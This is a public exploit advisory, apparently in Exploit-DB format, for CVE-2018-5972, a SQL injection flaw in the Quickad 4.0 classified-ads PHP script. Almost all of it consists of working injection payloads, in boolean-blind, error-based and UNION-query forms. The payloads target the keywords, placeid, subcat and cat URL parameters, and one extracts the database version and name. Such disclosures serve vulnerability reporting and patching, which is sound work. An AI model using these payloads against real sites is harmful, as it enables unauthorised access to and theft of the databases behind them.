@@ -1,0 +1,66 @@
+# # # # # 
+# Exploit Title: Classified Ads CMS - Quickad 4.0 - SQL Injection
+# Dork: N/A
+# Date: 23.01.2018
+# Vendor Homepage: http://bylancer.com/
+# Software Link: https://codecanyon.net/item/quickad-classified-ads-php-script/19960675
+# Version: 4.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2018-5972
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# 1)
+# http://localhost/[PATH]/listing?keywords=[SQL]&location=All%20United%20States&placetype=country&placeid=231[SQL]&cat=[SQL]&subcat=5[SQL]&filter=&sort=Newest&Submit=
+# 
+# ' UNION ALL SELECT NULL,CONCAT(version(),0x7e7e,database()),NULL-- gLLf
+# 
+# Parameter: keywords (GET)
+#     Type: boolean-based blind
+#     Title: AND boolean-based blind - WHERE or HAVING clause
+#     Payload: keywords=a%' AND 1665=1665 AND '%'='&location=All United States&placetype=country&placeid=231&cat=&subcat=5&filter=&sort=Newest&Submit=
+# 
+#     Type: error-based
+#     Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+#     Payload: keywords=a%' AND (SELECT 7944 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT (ELT(7944=7944,1))),0x716a6b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND '%'='&location=All United States&placetype=country&placeid=231&cat=&subcat=5&filter=&sort=Newest&Submit=
+# 
+# Parameter: placeid (GET)
+#     Type: boolean-based blind
+#     Title: AND boolean-based blind - WHERE or HAVING clause
+#     Payload: keywords=a&location=All United States&placetype=country&placeid=231') AND 1976=1976 AND ('lFmx'='lFmx&cat=&subcat=5&filter=&sort=Newest&Submit=
+# 
+#     Type: error-based
+#     Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+#     Payload: keywords=a&location=All United States&placetype=country&placeid=231') AND (SELECT 3263 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT (ELT(3263=3263,1))),0x716a6b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ('psTy'='psTy&cat=&subcat=5&filter=&sort=Newest&Submit=
+# 
+#     Type: UNION query
+#     Title: Generic UNION query (NULL) - 31 columns
+#     Payload: keywords=a&location=All United States&placetype=country&placeid=231') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71706a7871,0x465344587867724149544c5a556147787a5876737447595477725372556d4a576c786c50546d7667,0x716a6b6271),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- IJTp&cat=&subcat=5&filter=&sort=Newest&Submit=
+# 
+# Parameter: subcat (GET)
+#     Type: boolean-based blind
+#     Title: AND boolean-based blind - WHERE or HAVING clause
+#     Payload: keywords=a&location=All United States&placetype=country&placeid=231&cat=&subcat=5') AND 7923=7923 AND ('zhKR'='zhKR&filter=&sort=Newest&Submit=
+# 
+#     Type: error-based
+#     Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+#     Payload: keywords=a&location=All United States&placetype=country&placeid=231&cat=&subcat=5') AND (SELECT 5797 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT (ELT(5797=5797,1))),0x716a6b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ('SvkR'='SvkR&filter=&sort=Newest&Submit=
+# 
+#     Type: UNION query
+#     Title: Generic UNION query (NULL) - 31 columns
+#     Payload: keywords=a&location=All United States&placetype=country&placeid=231&cat=&subcat=5') UNION ALL SELECT CONCAT(0x71706a7871,0x6d72485769576563544a7a73516f67797544477a67515556755054545146717253556e676e705a74,0x716a6b6271),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- jcSO&filter=&sort=Newest&Submit=
+# 
+# Parameter: cat (GET)
+#     Type: UNION query
+#     Title: Generic UNION query (NULL) - 3 columns
+#     Payload: keywords=a&location=All United States&placetype=country&placeid=231&cat=' UNION ALL SELECT NULL,CONCAT(0x71706a7871,0x786a716b7066557459416e78454b506469534c61464f6d78664e434a49506c494b7a795243554556,0x716a6b6271),NULL-- gLLf&subcat=5&filter=&sort=Newest&Submit=
+# 
+# # # # #
